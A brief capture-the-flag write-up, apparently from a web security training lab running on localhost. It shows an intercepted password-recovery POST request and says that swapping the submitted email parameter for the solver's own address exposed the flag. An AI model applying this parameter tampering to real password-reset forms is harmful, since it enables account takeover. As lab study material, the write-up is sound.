# forgot my password

In Burp I could see that clicking on the recover password I send a POST like 

```txt
POST /index.php?page=recover HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://localhost:8081
Connection: keep-alive
Referer: http://localhost:8081/index.php?page=recover
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

mail=webmaster%40borntosec.com&Submit=Submit
```

I changed the last line to my email addr and got the flag displayed